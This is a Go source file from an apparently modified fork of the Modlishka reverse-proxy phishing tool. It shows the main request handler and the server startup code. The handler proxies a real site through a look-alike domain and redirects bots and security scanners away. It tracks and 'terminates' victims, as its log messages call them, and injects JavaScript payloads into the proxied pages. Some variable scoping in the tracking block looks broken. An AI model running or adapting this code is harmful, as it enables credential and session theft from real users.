/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import "C"
import (
    "crypto/tls"
    "crypto/x509"
    "errors"
    "fmt"
    "github.com/drk1wi/Modlishka/config"
    "github.com/drk1wi/Modlishka/log"
    "github.com/drk1wi/Modlishka/plugin"
    "github.com/drk1wi/Modlishka/runtime"
    "net"
    "net/http"
    "net/url"
    "strconv"
    "strings"
)

var ServerRuntimeConfig *ServerConfig

type ServerConfig struct {
    config.Options
    Handler *http.ServeMux
    Port string
}

type EmbeddedServer struct {
    http.Server
    WebServerCertificate     string
    WebServerKey             string
    WebServerCertificatePool string
}

func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {

    // check URL path for subdomain value
    rH := strings.Split(r.URL.String(),"/")
    p := ""
    for _, val := range rH[3:] {
        p += "/" + val
    }
    r.Host = rH[1]+"."+runtime.ProxyDomain
    if j, err := url.Parse(p); err == nil{ r.URL = j }else { return }

    AP := rH[2]
    UA := strings.ToLower(r.UserAgent())

    // User-Agent and IP/CIDR filtering
    if !runtime.Whitelist[AP] {
        if runtime.Blacklist[AP] {
            log.Debugf("Redirecting Blacklisted IP -> '%s' ",AP)
            Redirect(w, r, runtime.UnauthRedirectUrl, 302)
        } else {
            // check User Agent in botlist
            if runtime.ValRobsRegex(UA) {
                runtime.Blacklist[AP] = true
                log.Debugf("Redirecting Blacklisted Robot -> '%s' ",UA)
                Redirect(w, r, runtime.UnauthRedirectUrl, 302)
            }
        }
    }

    // Patch the FQDN
    targetDomain,newTLS,TLSvalue := runtime.TranslateRequestHost(r.Host)

    if !runtime.Whitelist[AP] {
        if !*conf.DisableSecurity && runtime.IsValidRequestHost(r.Host, runtime.ProxyDomain) == false {
            runtime.Blacklist[AP] = true
            log.Debugf("Redirecting client to %s",runtime.TopLevelDomain)
            Redirect(w, r, runtime.UnauthRedirectUrl, 302)
            return
        }
        if !*conf.DisableSecurity && len(targetDomain) > 0 && runtime.IsRejectedDomain(targetDomain) == true {
            runtime.Blacklist[AP] = true
            log.Debugf("Redirecting client to %s", runtime.TopLevelDomain)
            Redirect(w, r, runtime.UnauthRedirectUrl, 302)
            return
        }
    }

    // Check if the session should be terminated
    if _, err := r.Cookie(runtime.TERMINATE_SESSION_COOKIE_NAME); err == nil {
        // remove tracked client from IsTracked since cookies already set
        delete(runtime.IsTracked, AP)
        delete(runtime.IsLanded, AP)
        if len(*conf.TerminateRedirectUrl) > 0 {
            log.Debugf("Session terminated; Redirecting client to %s", *conf.TerminateRedirectUrl)
            Redirect(w, r, *conf.TerminateRedirectUrl, 308)
        } else {
            log.Debugf("Session terminated; Redirecting client to %s", runtime.TopLevelDomain)
            Redirect(w, r, "https://www."+runtime.Target, 308)
        }
        return
    }

    // Do a redirect when tracking cookie was already set . We want to get rid of the TrackingPram from the URL!
    queryString := r.URL.Query()
    if uid1, ok := queryString[runtime.TrackingParam]; ok {
        if uid2, err := r.Cookie(runtime.TrackingCookie); err == nil && uid1[0] == uid2.Value {
            delete(queryString, runtime.TrackingParam)
            r.URL.RawQuery = queryString.Encode()
            log.Debugf("User tracking: Redirecting client to %s", r.URL.String())
            Redirect(w, r, r.URL.String(), 302)
        }
    }

    targetURL:=""


    if (runtime.ForceHTTP == true || runtime.ForceHTTPS == true) && newTLS  == true {

            if TLSvalue == false {
                targetURL="http://"+ targetDomain
            } else {
                targetURL="https://"+targetDomain
            }

    } else {

        if r.TLS != nil {
            targetURL="https://"+targetDomain
        } else {
            targetURL="http://"+targetDomain
        }
    }

    log.Debugf("[P] Proxying target [%s] via domain [%s]", targetURL, runtime.ProxyDomain)


    origin := r.Header.Get("Origin")
    settings := &ReverseProxyFactorySettings{
        conf.Options,
        targetURL,
        r.Host,
        origin,
        false,
    }

    if r.TLS != nil {
        settings.IsTLS = true
    }

    reverseProxy := settings.NewReverseProxy()

    if runtime.CheckTermination(r.Host + r.URL.String()) {
        log.Debugf("[P] Time to terminate this victim! Termination URL matched: %s", r.Host+r.URL.String())
        reverseProxy.Terminate = true
    }

    if reverseProxy.Origin != "" {
        log.Debugf("[P] ReverseProxy Origin: [%s]", reverseProxy.Origin)
    }

    //set up user tracking variables
    if !runtime.IsTracked[AP] {
        tID := runtime.RandSeq(8)
        reverseProxy.RequestContext.InitUserID = tID
        reverseProxy.RequestContext.UserID = tID
        reverseProxy.RequestContext.IP = AP

        hostURL, _ := url.Parse(fmt.Sprintf("https://%s", r.URL.String()))
        // make TrackingParam array
        trk := make([]string, 1)
        trk[0] = tID

        // check visitor redirect to landing path
        if runtime.Landing && !runtime.IsLanded[AP] {

            // get already existing Query Params is exists, then include new tracking value
            if landing,err := url.Parse(runtime.ForwardTo); err != nil{
                log.Warningf("[P] Cannot parse config.ForwardTo value -> %s", runtime.ForwardTo)
                return
            }

            landingQuery := landing.Query()
            landingQuery[runtime.Tracker] = trk
            landing.RawQuery = landingQuery.Encode()

            // rewrite URL
            loc := hostURL.Host + landing.String()
            runtime.IsLanded[AP] = true

        }else {
            landingQuery := hostURL.Query()
            landingQuery[runtime.Tracker] = trk
            hostURL.RawQuery = landingQuery.Encode()
            
            // rewrite URL
            loc := hostURL
        }

        runtime.IsTracked[AP] = true

        log.Debugf("[P] Tracking victim %s  via parameter %s",reverseProxy.RequestContext.IP, tID)
        log.Debugf("[P] Redirecting visitor to new location =>>>  %s", loc)
        
        // redirect to new location
        Redirect(w, r, loc, 302)

    } else if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
        reverseProxy.RequestContext.UserID = cookie.Value
    }else{
        Redirect(w, r, runtime.UnauthRedirectUrl, 302)
    }

    //check if JS Payload should be injected
    if payload := runtime.GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
        reverseProxy.Payload = payload
    }

    reverseProxy.Proxy.ServeHTTP(w, r)
}

func (es *EmbeddedServer) ListenAndServeTLS(addr string) error {

    c := &tls.Config{
        MinVersion: tls.VersionTLS10,
    }
    if es.TLSConfig != nil {
        *c = *es.TLSConfig
    }
    if c.NextProtos == nil {
        c.NextProtos = []string{"http/1.1"}
    }

    var err error
    c.Certificates = make([]tls.Certificate, 1)
    c.Certificates[0], err = tls.X509KeyPair([]byte(es.WebServerCertificate), []byte(es.WebServerKey))

    if es.WebServerCertificatePool != "" {
        certpool := x509.NewCertPool()
        if !certpool.AppendCertsFromPEM([]byte(es.WebServerCertificatePool)) {
            err := errors.New("ListenAndServeTLS: can't parse client certificate authority")
            log.Fatalf(err.Error() + " . Terminating.")
        }
        c.ClientCAs = certpool
    }

    c.PreferServerCipherSuites = true
    if err != nil {
        return err
    }

    conn, err := net.Listen("tcp", addr)
    if err != nil {
        return err
    }

    tlsListener := tls.NewListener(conn, c)
    return es.Serve(tlsListener)
}

func SetServerRuntimeConfig(conf config.Options) {

    ServerRuntimeConfig = &ServerConfig{
        Options: conf,
        Handler: http.NewServeMux(),
    }

}

func RunServer() {

    ServerRuntimeConfig.Handler.HandleFunc("/", ServerRuntimeConfig.MainHandler)

    plugin.RegisterHandler(ServerRuntimeConfig.Handler)

    var listener= string(*ServerRuntimeConfig.ListeningAddress)
    var portHTTP = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTP)
    var portHTTPS = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTPS)
    
    welcome := fmt.Sprintf(`
%s

>>>> 
 Author:    Piotr Duszynski @drk1wi  
Reloaded:   紫の天才
              Murasaki No Tensai
                @
                  @
                    ...   ~0_0~   ...
                                              <<<<

~>> Reverse Proxy started
`, runtime.Banner)

    if *ServerRuntimeConfig.ForceHTTP  {

        var httplistener = listener + ":" + portHTTP
        welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
        log.Infof("%s", welcome)

        server := &http.Server{Addr: httplistener, Handler: ServerRuntimeConfig.Handler}

        if err := server.ListenAndServe(); err != nil {
            log.Fatalf("%s . Terminating.", err)
        }

    } else if *ServerRuntimeConfig.ForceHTTPS  {


        embeddedTLSServer := &EmbeddedServer{
            WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
            WebServerKey:             *ServerRuntimeConfig.TLSKey,
            WebServerCertificatePool: *ServerRuntimeConfig.TLSPool,
        }

        embeddedTLSServer.Handler = ServerRuntimeConfig.Handler

        var httpslistener= listener + ":" + portHTTPS

        welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)

        log.Infof("%s", welcome)


        err := embeddedTLSServer.ListenAndServeTLS(httpslistener)
        if err != nil {
            log.Fatalf(err.Error() + " . Terminating.")
        }


    } else {    //default mode

        embeddedTLSServer := &EmbeddedServer{
                WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
                WebServerKey:             *ServerRuntimeConfig.TLSKey,
                WebServerCertificatePool: *ServerRuntimeConfig.TLSPool,
            }

            embeddedTLSServer.Handler = ServerRuntimeConfig.Handler

            var HTTPServerRuntimeConfig = &ServerConfig{
                Options: ServerRuntimeConfig.Options,
                Handler: ServerRuntimeConfig.Handler,
                Port:    portHTTP,
            }

            var httpslistener= listener + ":" + portHTTPS
            var httplistener= listener + ":" + portHTTP

            welcome = fmt.Sprintf("%sListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
            welcome = fmt.Sprintf("%s\n\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)

            log.Infof("%s", welcome)

            go func() {
                server := &http.Server{Addr: httplistener, Handler: HTTPServerRuntimeConfig.Handler}
                if err := server.ListenAndServe(); err != nil {
                    log.Fatalf("%s . Terminating.", err)
                }
            }()

            err := embeddedTLSServer.ListenAndServeTLS(httpslistener)
            if err != nil {
                log.Fatalf(err.Error() + " . Terminating.")
            }

        }
    }
